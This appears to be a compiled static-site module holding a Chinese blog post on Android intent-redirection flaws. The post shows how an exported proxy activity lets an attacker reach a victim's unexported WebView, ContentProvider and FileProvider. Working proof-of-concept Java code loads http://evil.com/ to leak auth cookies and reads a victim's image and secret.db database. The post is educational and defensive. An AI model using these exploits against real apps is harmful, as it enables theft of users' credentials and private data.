import{_ as n,c as a,o as s,a as t}from"./app.4bbc222c.js";const v='{"title":"\u4E3A\u4EC0\u4E48\u8981\u4FDD\u62A4\u672A\u5BFC\u51FA\u7EC4\u4EF6","description":"","frontmatter":{"title":"\u4E3A\u4EC0\u4E48\u8981\u4FDD\u62A4\u672A\u5BFC\u51FA\u7EC4\u4EF6","date":"2022-01-06T13:57:03.000Z","draft":false,"tags":["security","app","android"],"categories":["\u6280\u672F\u76F8\u5173"]},"headers":[{"level":2,"title":"\u672A\u5BFC\u51FA\u7684Activity\u7BC7","slug":"\u672A\u5BFC\u51FA\u7684activity\u7BC7"},{"level":3,"title":"victim\u7684manifest","slug":"victim\u7684manifest"},{"level":3,"title":"ProxyActivity","slug":"proxyactivity"},{"level":3,"title":"victim\u7684AuthWebViewActivity","slug":"victim\u7684authwebviewactivity"},{"level":3,"title":"poc","slug":"poc"},{"level":2,"title":"\u672A\u5BFC\u51FA\u7684ContentProvider","slug":"\u672A\u5BFC\u51FA\u7684contentprovider"},{"level":3,"title":"victim\u7684manifest:","slug":"victim\u7684manifest-1"},{"level":3,"title":"attacker\u7684\u5BFC\u51FAActivity:","slug":"attacker\u7684\u5BFC\u51FAactivity"},{"level":3,"title":"poc:","slug":"poc-1"},{"level":2,"title":"\u672A\u5BFC\u51FA\u7684FileProvider","slug":"\u672A\u5BFC\u51FA\u7684fileprovider"},{"level":3,"title":"victim\u7684manifest","slug":"victim\u7684manifest-2"},{"level":3,"title":"res/xml/provider_paths.xml","slug":"res-xml-provider-paths-xml"},{"level":3,"title":"attacker\u7684LeakActivity","slug":"attacker\u7684leakactivity"},{"level":3,"title":"\u653B\u51FBpoc","slug":"\u653B\u51FBpoc"}],"relativePath":"app_security/android_access_protected_components.md"}',p={},e=t(`<p>\u5B89\u5353App\u7684\u6838\u5FC3\u662F\u56DB\u5927\u7EC4\u4EF6,\u800C\u8FD9\u56DB\u5927\u7EC4\u4EF6\u4E4B\u95F4\u7684\u901A\u4FE1\u4E3B\u8981\u4F9D\u8D56\u4E8EIntent. \u56DB\u5927\u7EC4\u4EF6\u6709\u5BFC\u51FA\u7684,\u4E5F\u6709\u672A\u5BFC\u51FA\u7684,\u5BFC\u51FA\u7684\u7EC4\u4EF6\u4EFB\u610Fapp\u90FD\u53EF\u4EE5\u901A\u8FC7Intent\u6765\u542F\u52A8.\u800C\u672A\u5BFC\u51FA\u7684\u7EC4\u4EF6\u5219\u53EA\u80FDApp\u81EA\u5DF1\u624D\u80FD\u542F\u52A8. \u6240\u4EE5\u5F88\u591A\u65F6\u5019\u672A\u5BFC\u51FA\u7EC4\u4EF6\u90FD\u8BA4\u4E3A\u542F\u52A8\u5B83\u7684Intent\u662F\u53EF\u4FE1\u7684. \u4F46\u662F\u5982\u679C\u6211\u4EEC\u53EF\u4EE5\u7ED5\u5F00\u8FD9\u4E2A\u9650\u5236,\u5C31\u627E\u5230\u65B0\u7684\u653B\u51FB\u70B9.</p><h1 id="\u4E3A\u4EC0\u4E48\u672A\u5BFC\u51FA\u7EC4\u4EF6\u9700\u8981\u4FDD\u62A4\u597D" tabindex="-1">\u4E3A\u4EC0\u4E48\u672A\u5BFC\u51FA\u7EC4\u4EF6\u9700\u8981\u4FDD\u62A4\u597D <a class="header-anchor" href="#\u4E3A\u4EC0\u4E48\u672A\u5BFC\u51FA\u7EC4\u4EF6\u9700\u8981\u4FDD\u62A4\u597D" aria-hidden="true">#</a></h1><h2 id="\u672A\u5BFC\u51FA\u7684activity\u7BC7" tabindex="-1">\u672A\u5BFC\u51FA\u7684Activity\u7BC7 <a class="header-anchor" href="#\u672A\u5BFC\u51FA\u7684activity\u7BC7" aria-hidden="true">#</a></h2><p>\u6211\u4EEC\u6709\u4E00\u4E2A\u672A\u5BFC\u51FA\u7684Webview,\u53EA\u80FD\u6253\u5F00\u6211\u4EEC\u4FE1\u4EFB\u7684\u9875\u9762,\u5E76\u4E14\u5B83\u662F\u672A\u5BFC\u51FA\u7684.</p><h3 id="victim\u7684manifest" tabindex="-1">victim\u7684manifest <a class="header-anchor" href="#victim\u7684manifest" aria-hidden="true">#</a></h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.ProxyActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.AuthWebViewActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>\u540C\u65F6app\u6709\u4E00\u4E2AProxyActivity,\u7528\u6765\u542F\u52A8\u5176\u4ED6Activity,\u5E76\u4E14\u662F\u5BFC\u51FA\u7684.</p><h3 id="proxyactivity" tabindex="-1">ProxyActivity <a class="header-anchor" href="#proxyactivity" aria-hidden="true">#</a></h3><p>ProxyActivity\u5728\u540E\u7EED\u4F8B\u5B50\u4E2D\u4F1A\u4E00\u76F4\u4F7F\u7528.</p><div class="language-java line-numbers-mode"><pre><code><span class="token function">startActivity</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">)</span> <span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParcelableExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="victim\u7684authwebviewactivity" tabindex="-1">victim\u7684AuthWebViewActivity <a class="header-anchor" href="#victim\u7684authwebviewactivity" aria-hidden="true">#</a></h3><p>\u56E0\u4E3AAuthWebViewActivity\u662F\u672A\u5BFC\u51FA\u7684,\u6240\u4EE5\u5B83\u5929\u7136\u4FE1\u4EFB\u5176\u6570\u636E\u6765\u6E90<code>getIntent</code>,\u5176\u4EE3\u7801\u5982\u4E0B:</p><div class="language-java line-numbers-mode"><pre><code>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringExtra</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getAuthHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc" tabindex="-1">poc <a class="header-anchor" href="#poc" aria-hidden="true">#</a></h3><p>\u9488\u5BF9\u8FD9\u79CD\u60C5\u51B5,\u6211\u4EEC\u5C31\u53EF\u4EE5\u6784\u9020\u8FD9\u6837\u7684\u653B\u51FB\u4EE3\u7801:</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.AuthWebViewActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://evil.com/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>\u8FBE\u5230AuthWebView\u8BBF\u95EEevil.com\u7684\u76EE\u7684,\u8FDB\u800C\u6CC4\u9732cookie,\u76D7\u53D6\u7528\u6237\u654F\u611F\u4FE1\u606F,\u751A\u81F3\u662F\u7A83\u53D6\u7528\u6237\u8D26\u53F7\u7684\u63A7\u5236\u6743.</p><h2 id="\u672A\u5BFC\u51FA\u7684contentprovider" tabindex="-1">\u672A\u5BFC\u51FA\u7684ContentProvider <a class="header-anchor" href="#\u672A\u5BFC\u51FA\u7684contentprovider" aria-hidden="true">#</a></h2><p>ContentProvider\u53EF\u4EE5\u8BA4\u4E3A\u662FApp\u7684\u6570\u636E\u5E93,\u5982\u679C\u4E00\u4E2A\u672A\u5BFC\u51FA\u7684ContentProvider\u8BBE\u7F6E\u4E86\`\`android:grantUriPermissions\`\u4E3Atrue,\u90A3\u4E48\u653B\u51FB\u8005\u5C31\u53EF\u80FD\u501F\u6B64\u83B7\u53D6\u5230\u76F8\u5173\u6587\u4EF6\u4EE5\u53CA\u6570\u636E\u7684\u8BFB\u5199\u6743\u9650.</p><p>\u4E0EContentProvider\u76F8\u5173\u7684\u4E00\u4E9B\u5173\u952EFlag:</p><ul><li><code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code> \u6C38\u4E45\u8BBF\u95EE\u8FD9\u4E2AContentProvider\u7684\u6743\u9650,\u6CA1\u6709\u8BBE\u7F6E\u7684\u8BDD\u53EA\u662F\u4E00\u6B21\u6027\u7684.</li><li><code>Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code> \u6388\u4E88\u7684\u6743\u9650\u4E0D\u662F\u67D0\u4E2A\u56FA\u5B9A\u7684uri,\u800C\u662F\u4E00\u6279uri,\u8FD9\u4E9Buri\u53EA\u8981\u6709\u5171\u540C\u7684\u524D\u7F00\u5373\u53EF.</li><li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code> \u6388\u4E88\u8BFB\u6743\u9650</li><li><code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> \u6388\u4E88\u5199\u6743\u9650</li></ul><p>\u4E0B\u9762\u6211\u4EEC\u6765\u6784\u9020\u4E00\u4E2A\u653B\u51FB\u6837\u4F8B:</p><h3 id="victim\u7684manifest-1" tabindex="-1">victim\u7684manifest: <a class="header-anchor" href="#victim\u7684manifest-1" aria-hidden="true">#</a></h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provider</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.ContentProvider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>authorities</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.provider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>grantUriPermissions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.ProxyActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>\u5176\u4E2DProxyActivity\u540C\u4E0A.</p><h3 id="attacker\u7684\u5BFC\u51FAactivity" tabindex="-1">attacker\u7684\u5BFC\u51FAActivity: <a class="header-anchor" href="#attacker\u7684\u5BFC\u51FAactivity" aria-hidden="true">#</a></h3><p>LeakActivity.java</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Uri</span> uri <span class="token operator">=</span> <span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDataString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;image/1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// content://com.victim.provider/image/1</span>
<span class="token class-name">Bitmap</span> bitmap <span class="token operator">=</span> <span class="token class-name">BitmapFactory</span><span class="token punctuation">.</span><span class="token function">decodeStream</span><span class="token punctuation">(</span><span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openInputStream</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// stolen image</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc-1" tabindex="-1">poc: <a class="header-anchor" href="#poc-1" aria-hidden="true">#</a></h3><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_PERSISTABLE_URI_PERMISSION
        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_PREFIX_URI_PERMISSION
        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_READ_URI_PERMISSION
        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_WRITE_URI_PERMISSION<span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;com.attacker.LeakActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.victim.provider/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h2 id="\u672A\u5BFC\u51FA\u7684fileprovider" tabindex="-1">\u672A\u5BFC\u51FA\u7684FileProvider <a class="header-anchor" href="#\u672A\u5BFC\u51FA\u7684fileprovider" aria-hidden="true">#</a></h2><p>FileProvider\u5B9E\u9645\u4E0A\u662FContentProvider\u7684\u4E00\u4E2A\u5B50\u7C7B,\u5982\u540C\u540D\u5B57\u4E00\u6837,\u5176\u4E13\u6CE8\u4E8E\u6587\u4EF6\u7684\u5206\u4EAB. \u4E0B\u9762\u6211\u4EEC\u540C\u6837\u6784\u9020\u4E00\u4E2AFileProvider\u7684\u6587\u4EF6\u4EFB\u610F\u8BFB\u5199\u7684\u4F8B\u5B50:</p><h3 id="victim\u7684manifest-2" tabindex="-1">victim\u7684manifest <a class="header-anchor" href="#victim\u7684manifest-2" aria-hidden="true">#</a></h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provider</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>androidx.core.content.FileProvider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>authorities</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.files_provider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>grantUriPermissions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta-data</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.support.FILE_PROVIDER_PATHS<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>@xml/provider_paths<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>provider</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>\u6CE8\u610F\u5230:</p><ol><li>\u5B83\u662FFileProvider</li><li>\u5B83\u7684android:grantUriPermissions</li><li>\u5206\u4EAB\u8DEF\u5F84\u4FE1\u606F\u5728<code>@xml/provider_paths</code>,\u4E5F\u5C31\u662F<code>res/xml/provider_paths.xml</code></li></ol><h3 id="res-xml-provider-paths-xml" tabindex="-1">res/xml/provider_paths.xml <a class="header-anchor" href="#res-xml-provider-paths-xml" aria-hidden="true">#</a></h3><div class="language-xml line-numbers-mode"><pre><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>paths</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>root<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>files-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>internal_files<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cache-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cache<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>external-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>external_files<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>images<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>paths</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>\u8FD9\u91CC\u987A\u4FBF\u8BF4\u4E00\u4E0B,\u5982\u65E0\u5FC5\u8981,\u5C3D\u91CF\u4E0D\u8981\u76F4\u63A5\u5206\u4EABroot,\u8FD9\u662F\u975E\u5E38\u5371\u9669\u7684,\u4E00\u65E6\u88AB\u83B7\u53D6\u5230\u6743\u9650,\u6574\u4E2Aapp\u7684\u6240\u6709\u4FE1\u606F\u90FD\u4F1A\u4E00\u89C8\u65E0\u4F59.</p><h3 id="attacker\u7684leakactivity" tabindex="-1">attacker\u7684LeakActivity <a class="header-anchor" href="#attacker\u7684leakactivity" aria-hidden="true">#</a></h3><p>attacker\u8981\u80FD\u6536\u5230\u76F8\u5E94\u7684Intent,\u624D\u80FD\u83B7\u53D6\u5230\u6587\u4EF6\u7684\u8BFB\u5199\u6743\u9650. LeakActivity.java</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">InputStream</span> i <span class="token operator">=</span> <span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openInputStream</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="\u653B\u51FBpoc" tabindex="-1">\u653B\u51FBpoc <a class="header-anchor" href="#\u653B\u51FBpoc" aria-hidden="true">#</a></h3><p>\u548CContentProvider\u662F\u7C7B\u4F3C\u7684,\u53EA\u4E0D\u8FC7\u8FD9\u6B21\u9488\u5BF9\u7684\u662FFileProvider.</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_READ_URI_PERMISSION<span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;com.attacker.LeakActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
extra<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>\u53C2\u8003\u6587\u6863: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noopener noreferrer">Android: Access to app protected components</a></p>`,46),o=[e];function c(i,l,u,r,k,d){return s(),a("div",null,o)}var b=n(p,[["render",c]]);export{v as __pageData,b as default};
